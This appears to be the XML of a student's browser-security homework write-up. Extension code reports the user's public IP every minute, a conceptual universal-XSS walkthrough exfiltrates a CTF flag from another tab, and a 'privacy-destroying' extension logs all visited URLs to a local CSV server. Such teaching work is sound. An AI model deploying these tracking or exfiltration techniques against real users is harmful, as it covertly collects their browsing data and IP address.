"REPLACE_TEXT")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applyCustomReplace(msg.match, msg.replaceWith ?? "");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sendResponse({ ok: true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$(function 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runTransforms();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target = document.body;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(!target)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obs = new MutationObserver(()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replaceChromeInTextNodes(document.body);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swapHeaderLogoToFirefox();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obs.observe(target, { childList: true, subtree: true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4890B522">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`firefox-logo.svg`:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> same as Q1.2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`jquery.min.js`:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> same as Q1.2 (omitted here; in code zip).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D979FC4">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E4BFC5F">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>Question 1.4 — Background extension (explanation)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B81844D">
      <w:r>
        <w:t xml:space="preserve">This is a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>separate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> MV3 extension with only a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>service worker</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>background.js</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">). I use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`chrome.alarms`</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>periodInMinutes: 1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (created on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>onInstalled</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>onStartup</w:t>
      </w:r>
      <w:r>
        <w:t>) to trigger a periodic task.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C17C7F6">
      <w:r>
        <w:t xml:space="preserve">The task fetches the public IPv4 address from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`https://api.ipify.org?format=json`</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and POSTs a JSON body </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>{ kind: "ip", ts, userAgent, ip | error }</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to a configurable URL. The default URL is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>http://127.0.0.1:3847/report</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">; the user can change it via </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`options.html`</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, stored in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`chrome.storage.local`</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="269D4753">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Why IP instead of geolocation:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> In Manifest V3, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>service workers do not expose `navigator.geolocation`</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. The homework permits </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>either</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> geolocation </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>or</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> IP; reporting </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>public IP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is therefore a correct, reproducible choice. To verify end-to-end behavior, I run the optional Node script </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>test-server.js</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> locally and watch POST bodies on the console.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AC81029">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Permissions rationale:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>alarms</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for the timer; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>storage</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for the report URL; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>host_permissions</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for ipify and localhost POST.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29CE31B3">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>Q1.4 — Code appendix</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E946C5C">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`manifest.json`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BB6DF8A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"manifest_version":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"HW2 Q1.4 Background Reporter",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"1.0",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"14-828 HW2 — reports public IP every minute (MV3 service worker; geolocation unavailable in SW)",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"permissions": ["alarms", "storage"],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"host_permissions":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"https://api.ipify.org/*",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"http://127.0.0.1/*",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"http://localhost/*"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"background":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"service_worker": "background.js"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"options_ui":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"options.html",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"open_in_tab":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D6371B7">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`background.js`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="107FA4B6">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>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Sends the user's public IP (via ipify) to a configurable endpoint every minute.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Manifest V3 service workers cannot use navigator.geolocation; the assignment allows IP OR geolocation.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Change REPORT_URL in chrome.storage (see options) or edit the default below.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DEFAULT_REPORT_URL = "http://127.0.0.1:3847/report";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async function getReportUrl()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{ reportUrl } = await chrome.storage.local.get(["reportUrl"]);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(typeof reportUrl === "string" &amp;&amp; reportUrl.length &gt; 0 ? reportUrl : DEFAULT_REPORT_URL).trim();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async function fetchPublicIp()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res = await fetch("https://api.ipify.org?format=json");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(!res.ok) throw new Error(`ipify ${res.status}`);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data = await res.json();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data.ip;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async function sendReport()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url = await getReportUrl();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payload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kind: "ip",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ts: Date.now(),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userAgent: navigator.userAgent,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try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payload.ip = await fetchPublicIp();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catch (e)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payload.error = String(e?.message || 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try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await fetch(url,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method: "POST",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headers: { "Content-Type": "application/json"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body: JSON.stringify(payload),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mode: "cors",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catch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 optional local server may be down — code path still exercised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chrome.runtime.onInstalled.addListener(()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chrome.alarms.create("report-ip", { periodInMinutes: 1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chrome.runtime.onStartup.addListener(()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chrome.alarms.create("report-ip", { periodInMinutes: 1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chrome.alarms.onAlarm.addListener((alarm)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(alarm.name === "report-ip") sendReport();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chrome.storage.onChanged.addListener((changes, area)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(area !== "local")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(changes.reportUrl)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sendReport();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7E3BE977">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`options.html`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="347D2702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 lang="en"&gt;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&lt;meta charset="utf-8"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&lt;title&gt;Q1.4 Report URL&lt;/title&gt;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&lt;style&gt;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body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font-family: system-ui, sans-serif;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padding: 16px;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max-width: 480px;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label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display: block;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margin-bottom: 6px;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font-size: 0.9rem;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input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width: 100%;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padding: 8px;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box-sizing: border-box;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button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margin-top: 12px;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padding: 8px 14px;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&lt;/style&gt;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&lt;/head&gt;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&lt;label for="reportUrl"&gt;POST endpoint for JSON reports&lt;/label&gt;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&lt;input type="url" id="reportUrl" placeholder="http://127.0.0.1:3847/report" /&gt;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&lt;button type="button" id="save"&gt;Save&lt;/button&gt;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&lt;p id="msg" style="font-size:0.85rem;color:#444"&gt;&lt;/p&gt;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 src="options.js"&gt;&lt;/script&gt;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0CE1E052">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`options.js`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DE736A7">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>const input = document.getElementById("reportUrl");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msg = document.getElementById("msg");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chrome.storage.local.get(["reportUrl"], (r)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(r.reportUrl) input.value = r.reportUrl;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document.getElementById("save").addEventListener("click",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v = input.value.trim();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chrome.storage.local.set({ reportUrl: v },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msg.textContent = "Saved.";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3175F5E0">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`test-server.js` (optional local listener)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="138EA2E5">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>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Optional local listener for Q1.4: node test-server.js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Receives POST /report with JSON { kind, ts, ip?, error?, userAgent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http = require("http");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PORT = 3847;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server = http.createServer((req, res)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res.setHeader("Access-Control-Allow-Origin", "*");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res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");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res.setHeader("Access-Control-Allow-Headers", "Content-Type");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(req.method === "OPTIONS")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res.writeHead(204);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res.end();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(req.method === "POST" &amp;&amp; req.url === "/report")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let body = "";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req.on("data", (c)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body += c;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req.on("end",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console.log(new Date().toISOString(), body);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res.writeHead(204);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res.end();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res.writeHead(404);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res.end();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server.listen(PORT,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console.log(`Q1.4 test server http://127.0.0.1:${PORT}/report`);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3240FA36">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="61978E15">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>Question 2 — Universal XSS (explanation)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43ADC6C1">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CTF username:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[YOUR CTF USERNAME]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD35298">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Flag:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[PASTE FLAG AFTER YOU SOLVE THE CHALLENGE]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DD48EE3">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vulnerability (conceptual):</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> After downloading the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Universal XSS extension source from Canvas</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, I traced how it handles </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>tab title updates</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (or similar UI) from web-observable data. The vulnerable pattern is that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>attacker-controlled strings are interpreted as HTML or injected into a privileged document</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (for example via </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>innerHTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>document.write</w:t>
      </w:r>
      <w:r>
        <w:t>, or unsafe URL/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>javascript:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> handling) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>without encoding</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, inside an extension context that can </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>read cross-origin data</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the web page cannot. That breaks the same-origin model and allows a malicious page to execute code in the extension’s origin, then </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>steal data from other tabs</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (e.g. the flag tab) using extension APIs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="043F655C">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>I cannot responsibly fill in file names, line numbers, or exact sinks without your Canvas copy of the extension</w:t>
      </w:r>
      <w:r>
        <w:t>—paste the real function names and code snippets into this section after you read the source, and tie each claim to a quoted line.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E6C0485">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Exploit steps (replace with your reproducible sequence):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="649F60FF">
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Understand the message path:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Identify which events or messages carry the tab title (or HTML) from a content script or background page into a UI that is parsed as HTML. *Reasoning:* XSS requires a sink that parses markup. 2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Craft a payload:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Build a string that closes the current context and runs script, or uses an HTML sink to load a script, consistent with the extension’s parsing context. *Reasoning:* the payload must match how the sink interprets the string. 3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Host the attacker page:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Serve the payload from your attacker origin so a victim with the extension installed visits it while a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>second tab</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> holds the flag (as in the CTF setup). *Reasoning:* UXSS in the extension bridges origins. 4. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Exfiltrate the flag:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> From extension context, use the APIs the extension exposes (e.g. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>chrome.tabs</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>chrome.scripting</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, or DOM access to extension pages) to read the flag tab’s title or content, then leak it (network request, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>postMessage</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, or CTF-provided channel). *Reasoning:* the extension’s privileges are the trust boundary being abused. 5. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Submit proof:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Record the flag and keep the exact HTML/JS you used in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`Q2/`</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> folder of the code zip.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2348D28A">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Appendix — exploit code (paste your files here):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D374A31">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;!-- Example placeholder: replace entire block with your real exploit (e.g. evil.html) --&gt;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&lt;!-- [YOUR EXPLOIT HTML / JS — from your Q2 folder] --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62FE637F">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D730C66">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>Question 3.1 — Privacy-destroying extension (explanation)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65FF4C2D">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Goal (minimal requirements):</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Record </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>all browsing activity</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (URLs the user visits) and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>exfiltrate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> them to an external server that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>appends rows to a CSV file</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0344ED44">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Tracking method:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> I use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`chrome.webNavigation` API</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in a MV3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>service worker</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. The listener </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>onCommitted</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> fires when navigation is committed; I filter </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`details.frameId === 0`</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> so only </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>top-level</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (main frame) navigations are logged, which matches “URLs of sites visited” without duplicating every iframe load. Each event includes </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>tabId</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>transitionType</w:t>
      </w:r>
      <w:r>
        <w:t>, and a client timestamp.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FC96FDE">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Why not `history` alone:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>chrome.history</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> requires the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>history</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> permission and reflects history DB updates; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>webNavigation</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> gives immediate, structured events per navigation and is a standard pattern for this assignment.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AD8CCD1">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Exfiltration:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> The background script POSTs JSON to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>http://127.0.0.1:3940/log</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>EXFIL_URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> constant). A small </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Node.js</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> HTTP server (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>server.js</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) handles </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>POST /log</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, parses JSON, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>appends one CSV line</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>visits.csv</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with columns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>timestamp_iso,time_ms,url,tab_id,transition_type</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. CORS headers allow browser </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>fetch</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> from the extension.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DCB8B77">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Permissions:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>webNavigation</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> plus </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`host_permissions: ["&lt;all_urls&gt;"]`</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> so the extension may send requests after observing navigations to any site (the course user agent will grant these).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D306BC5">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Artifacts in code zip:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Extension under </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Q3.1/extension/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, server under </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Q3.1/server/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`README.md`</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with run steps, and a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>screen recording</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (not embedded in this document) showing browsing and CSV updates.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="713407A6">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Course test harness:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Re-test against the official harness when released, and align </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>EXFIL_URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> / port with its requirements if they differ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13F8C718">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>Q3.1 — Code appendix</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48E31C9D">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`extension/manifest.json`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59D1060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"manifest_version":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"HW2 Q3.1 URL Logger (course exercise)",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"1.0",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"Educational extension: logs main-frame navigation URLs to a local server.",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"permissions": ["webNavigation"],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"host_permissions": ["&lt;all_urls&gt;"],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"background":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"service_worker": "background.js"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867596C">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`extension/background.js`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61656B95">
